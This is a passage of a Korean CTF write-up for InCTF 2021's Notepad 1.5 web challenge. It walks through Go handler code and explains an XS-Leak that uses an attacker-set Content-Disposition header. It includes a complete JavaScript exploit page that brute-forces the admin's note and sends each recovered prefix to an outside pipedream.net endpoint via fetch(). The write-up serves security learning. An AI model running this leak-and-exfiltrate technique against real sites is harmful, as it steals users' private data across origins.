		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"404 No Note Found"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">"&lt;[a-zA-Z0-9]"</span><span class="p">)</span><span class="o">.</span><span class="n">MatchString</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">html</span><span class="o">.</span><span class="n">EscapeString</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">/get</code> 기능은 <code class="language-plaintext highlighter-rouge">/add</code> 기능으로 작성한 메모를 보여주는 기능 입니다. <code class="language-plaintext highlighter-rouge">getIDFromCooke()</code> 함수로 <code class="language-plaintext highlighter-rouge">id</code>를 가져와서 <code class="language-plaintext highlighter-rouge">id</code> 값을 가진 메모를 가져온 후에 <code class="language-plaintext highlighter-rouge">Fprintf()</code> 함수로 출력하는 것을 볼 수 있습니다.</p>

<div class="language-go highlighter-rouge"><div class="code-header">
        <span data-label-text="Go"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="rouge-code"><pre><span class="k">func</span> <span class="n">find</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>

	<span class="n">param</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span>
	<span class="n">x</span> <span class="o">:=</span> <span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span>

	<span class="k">var</span> <span class="n">which</span> <span class="kt">string</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">param</span><span class="p">[</span><span class="s">"condition"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">which</span> <span class="o">=</span> <span class="s">"any"</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">which</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">]</span>
	<span class="p">}</span>

	<span class="k">var</span> <span class="n">start</span> <span class="kt">bool</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="s">"startsWith"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">start</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">"arthur"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">start</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="p">}</span>
	<span class="k">var</span> <span class="n">responseee</span> <span class="kt">string</span>
	<span class="k">var</span> <span class="n">end</span> <span class="kt">bool</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="s">"endsWith"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">end</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasSuffix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">"morgan"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">end</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasSuffix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"starts"</span> <span class="o">&amp;&amp;</span> <span class="n">start</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"ends"</span> <span class="o">&amp;&amp;</span> <span class="n">end</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"both"</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">start</span> <span class="o">&amp;&amp;</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"any"</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">start</span> <span class="o">||</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">_</span><span class="p">,</span> <span class="n">present</span> <span class="o">:=</span> <span class="n">param</span><span class="p">[</span><span class="s">"debug"</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">present</span> <span class="p">{</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"debug"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"startsWith"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"endsWith"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"condition"</span><span class="p">)</span>

			<span class="k">for</span> <span class="n">v</span><span class="p">,</span> <span class="n">d</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">param</span> <span class="p">{</span>
				<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">k</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">d</span> <span class="p">{</span>

					<span class="k">if</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">"^[a-zA-Z0-9{}_;-]*$"</span><span class="p">)</span><span class="o">.</span><span class="n">MatchString</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">5</span> <span class="p">{</span>
						<span class="n">w</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
					<span class="p">}</span>
					<span class="k">break</span>
				<span class="p">}</span>
				<span class="k">break</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="s">"404 No Note Found"</span>
	<span class="p">}</span>
	<span class="n">headerSetter</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">cType</span><span class="p">)</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">responseee</span><span class="p">)</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">/find</code> 기능은 사용자가 저장한 메모가 존재하는 지 없는 지 찾은 후에, 존재/미존재를 분기로 처리하는 로직입니다.</p>

<ul>
  <li>Information</li>
</ul>

<ol>
  <li>condition 값을 가져와서 str 변수에 저장합니다.</li>
  <li>만약 에러가 났다면 which 변수에 <code class="language-plaintext highlighter-rouge">"any"</code>라는 문자열을 넣어주고, 에러가 나지 않았다면 우리가 입력한 condition의 값을 which에 넣어줍니다.</li>
  <li>startsWith 값을 가져와서 str 변수에 저장합니다.</li>
  <li>에러가 나지 않았다면 <code class="language-plaintext highlighter-rouge">strings.HasPrefix()</code> 메서드를 이용해서 <code class="language-plaintext highlighter-rouge">startsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code class="language-plaintext highlighter-rouge">strings.HasPrefix()</code> 메서드는 자바스크립트에서 includes()와 동일 합니다. )</li>
  <li>endsWith 값을 가져와서 str 변수에 저장합니다.</li>
  <li>에러가 나지 않았다면 <code class="language-plaintext highlighter-rouge">strings.HasSuffix()</code> 메서드를 이용해서 <code class="language-plaintext highlighter-rouge">endsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code class="language-plaintext highlighter-rouge">strings.HasSuffix()</code> 메서드는 자바스크립트에서 includes()와 동일 하지만 뒤에서부터 검사합니다. )</li>
  <li>start/end 로직이 끝나면 여러 분기 별로 처리하는 것을 볼 수 있는데, 이때 모든 분기와 일치하지 않는 다면 debug 값을 가져와서 _와 present에 넣는 것을 볼 수 있습니다. 이때 present에는 true가 들어갑니다.</li>
  <li>presend의 값이 true 이면 <code class="language-plaintext highlighter-rouge">debug</code>, <code class="language-plaintext highlighter-rouge">startWith</code>, <code class="language-plaintext highlighter-rouge">endsWith</code>, <code class="language-plaintext highlighter-rouge">condition</code> 파라미터를 모두 지우고, 다른 파라미터가 있다면 해당 파라미터를 기반으로 <code class="language-plaintext highlighter-rouge">Header()</code> 메서드를 이용해서 응답 헤더를 설정하는 것을 볼 수 있습니다.</li>
  <li>모든 처리가 끝나면 <code class="language-plaintext highlighter-rouge">headerSetter()</code> 함수를 이용해서 응답 헤더를 설정하고, Fprintf() 함수를 이용해서 출력하는 것을 볼 수 있습니다.</li>
</ol>

<p>여기서 중요한 부분은 우리가 입력한 값과 노트의 값이 일치 하지 않으면 else 문 내부에 들어가는데, 여기서 응답 헤더 하나를 우리가 설정할 수 있다는 것 입니다. 우린 아까 위에서 <code class="language-plaintext highlighter-rouge">Download Trigger</code>에 대해서 배웠는데, 엔드포인트에서 <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code> 헤더를 설정해서 반환하면 브라우저는 첨부 파일을 탐색하고 파일을 설치 한다는 것을 배웠습니다.</p>

<p>그럼 우리가 입력한 값과 노트의 값이 일치 하지 않을 때는 <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code> 헤더를 설정해 파일이 다운로드 되게 하고, 우리가 입력한 값과 노트의 값이 일치하면 파일은 다운로드 하지 않게 만들 수 있고, 이를 이용하면 XS-Leak 공격을 이용해 노트 값을 파악할 수 있습니다.</p>

<p>그러므로 봇을 이용해 <code class="language-plaintext highlighter-rouge">/find</code>로 요청을 보내면 <code class="language-plaintext highlighter-rouge">id</code> 값은 관리자의 <code class="language-plaintext highlighter-rouge">id</code> 이므로 노트의 값으로 플래그가 들어올 것 이고, 이를 XS-Leak 공격을 이용해서 플래그를 획득할 수 있습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129488305-9cb0ce17-2495-4db8-8b46-bd82eb8ba3c3.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129488305-9cb0ce17-2495-4db8-8b46-bd82eb8ba3c3.png" alt="image" loading="lazy"></a></p>

<p>분석한 <code class="language-plaintext highlighter-rouge">/find</code> 로직을 확인하기 위해 위와 같이 메모를 작성했습니다.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/129488320-fbd08b0b-ff14-4b85-ae4c-007499638885.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129488320-fbd08b0b-ff14-4b85-ae4c-007499638885.png" alt="image" loading="lazy"></a>
<a href="https://user-images.githubusercontent.com/49112423/129488348-72e7814b-8385-40fa-b007-56cf503173c3.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129488348-72e7814b-8385-40fa-b007-56cf503173c3.png" alt="image" loading="lazy"></a></p>

<p>확인을 해보니 입력값과 노트 값이 일치하면 노트 값이 출력이 되고, 일치 하지 않으면 파일이 다운로드 되는 것을 확인할 수 있었습니다. 이제 이를 이용해 플래그를 획득하면 될 거 같습니다.</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>Notepad 1.5 - Arthur's Article Poc<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;script&gt;</span>
            <span class="kd">const</span> <span class="nx">string</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">abcdefghijklmnopqrstuvwxyz1234567890~}{!@$%^*)(_+</span><span class="dl">"</span><span class="p">;</span>

            <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">inctf{</span><span class="dl">'</span><span class="p">;</span>

            <span class="kd">function</span> <span class="nf">xs</span><span class="p">(</span><span class="nx">flag</span><span class="p">,</span> <span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`http://chall.notepad15.gq:1515/find?condition=starts&amp;debug&amp;Content-Disposition=attachment&amp;startsWith=</span><span class="p">${</span><span class="nx">flag</span> <span class="o">+</span> <span class="nx">str</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
                <span class="kd">const</span> <span class="nx">MyWindow</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
                <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                    <span class="k">try</span><span class="p">{</span>
                        <span class="nx">MyWindow</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">flag</span> <span class="o">+=</span> <span class="nx">str</span><span class="p">;</span>
                        <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">)</span>
                        <span class="nf">broute_force</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="kd">function</span> <span class="nf">broute_force</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for</span> <span class="p">(</span> <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nf">xs</span><span class="p">(</span><span class="nx">flag</span><span class="p">,</span> <span class="nx">string</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="nf">broute_force</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://user-images.githubusercontent.com/49112423/129514189-90b0699c-6f47-47b7-b49d-68fe1dd7a614.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/129514189-90b0699c-6f47-47b7-b49d-68fe1dd7a614.png" alt="image" loading="lazy"></a></p>

<p>위와 같이 익스플로잇 코드를 작성 후에 봇으로 넘겨주니 위와 같이 플래그를 뽑을 수 있었습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : inctf{red_dead_rezoday_ialmvwoawpwe}
</pre></td></tr></tbody></table></code></div></div>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=InCTF%202021%20Notepad%201.5%20-%20Arthur's%20Article%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIn-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=InCTF%202021%20Notepad%201.5%20-%20Arthur's%20Article%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIn-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIn-CTF%2F&text=InCTF%202021%20Notepad%201.5%20-%20Arthur's%20Article%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              




            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Hayyim-CTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1644794993"
  data-df="ll"
  
>
  Feb 14, 2022
</time>

              <h4 class="pt-0 my-2">Hayyim CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary

This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.


(Web) Cyberchef [100 pts]

T...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/GoN-CTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1647905393"
  data-df="ll"
  
>
  Mar 22, 2022
</time>

              <h4 class="pt-0 my-2">Spring GoN Open Qual CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary

This time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.


  Summary
    
      (Q)...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Line-CTF-2022/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1648371653"
  data-df="ll"
  
>
  Mar 27, 2022
</time>

              <h4 class="pt-0 my-2">Line CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary


  Summary
  (Web) gotm
  (Web) online-library


I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf.

So I am very not good. Just get a stress. So...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/UIU-CTF/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>UIU CTF 2021 yana Write Up</p>
    </a>
  

  
    <a
      href="/posts/WhiteHat-Contest/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Whitehat Contest 2021 Write Up</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

